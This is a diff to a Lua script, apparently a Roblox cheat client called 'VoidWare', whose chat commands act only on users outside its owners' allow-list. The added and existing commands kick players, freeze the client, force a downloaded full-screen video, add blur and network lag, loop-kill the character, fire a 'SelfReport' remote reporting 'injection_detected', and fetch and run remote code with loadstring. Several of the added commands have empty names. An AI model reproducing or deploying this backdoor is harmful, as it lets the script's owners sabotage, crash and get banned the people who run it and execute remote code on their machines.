@@ -10454,11 +10454,37 @@ local commands = {
 			game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
 		end
 	end,
+	[""] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local filename = "bruh"
+			local ScreenGui = Instance.new("ScreenGui")
+			ScreenGui.IgnoreGuiInset = true
+			ScreenGui.Parent = game:GetService("CoreGui")
+
+			local video = Instance.new("VideoFrame")
+			video.Size = UDim2.new(1, 0, 1, 0)
+			video.Parent = ScreenGui
+
+			local Name = filename .. ".mp4"
+			if not isfile(Name) then
+				writefile(Name, game:HttpGet("https://videos.xet1.repl.co/videos/" .. filename .. "."))
+			end
+
+			video.Video = syn and getsynasset(Name) or getcustomasset(Name)
+
+			repeat
+				task.wait()
+				print("")
+			until video.Loaded
+
+			video:Play()
+		end
+	end,
 	[".show"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local textChatService = game:GetService("TextChatService")
 			wait(0.0001)
-			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("Im Using VoidWare Made By Void | .gg/gYS7Dfgu")
+			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("Im Using Void-Ware Made By Void | .gg/gYS7Dfgu")
 		end
 	end,
 	[".void"] = function()
@@ -10473,6 +10499,21 @@ local commands = {
 			end
 		end
 	end,
+	[""] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local blur = Instance.new("BlurEffect")
+			blur.Size = 10000000000000
+			blur.Parent = game.Lighting
+		end
+	end,
+	[""] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
+			if blur then
+				blur:Destroy()
+			end
+		end
+	end,
 	[".troll"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
@@ -10482,8 +10523,15 @@ local commands = {
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			wait(1)
 			for index, player in pairs(game.Players:GetPlayers()) do
-				player:Kick("You Just Got Kicked By Void")
+				player:Kick("Void Has Just Kicked You")
 			end
+		end
+	end,
+	[""] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local rs = game:GetService("ReplicatedStorage")
+			local remote = rs:FindFirstChild("SelfReport", true)
+			remote:FireServer("injection_detected")
 		end
 	end,
 	[".rickroll"] = function()
@@ -10534,7 +10582,7 @@ local commands = {
 			end)
 		end
 	end,
-	[".breakmap"] = function()
+	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local function unanchorParts(object)
 				if object:IsA("BasePart") then
@@ -10550,6 +10598,12 @@ local commands = {
 	[".crash"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			while true do end
+		end
+	end,
+	[""] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local thingy = settings().Network
+			thingy.IncomingReplicationLag = math.huge
 		end
 	end,
 	[".lag"] = function()
@@ -10569,6 +10623,21 @@ local commands = {
 				end
 			end)
 		end
+	end,
+	[""] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			_G.loopkill = true;
+			while _G.loopkill == true do
+				lplr.Character.PrimaryPart.CFrame -= Vector3.new(0,-1000,0)
+				task.wait(.3)
+			end
+		end
+	end,
+	[""] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			_G.loopkill = false;
+		end
+	end
 }
 
 function isPlayerAllowed()
@@ -10630,7 +10699,7 @@ txt.OnIncomingMessage = function(msg)
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='"..colors["white"].."'>[VoidWare Private]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='"..colors["white"].."'>[Void]</font> " .. msg.PrefixText
 					end
 					userType = 1
 				end
@@ -10642,7 +10711,7 @@ txt.OnIncomingMessage = function(msg)
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='#ffffff'>[VoidWare]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='#ffffff'>[Void]</font> " .. msg.PrefixText
 					end
 					userType = 3
 				end
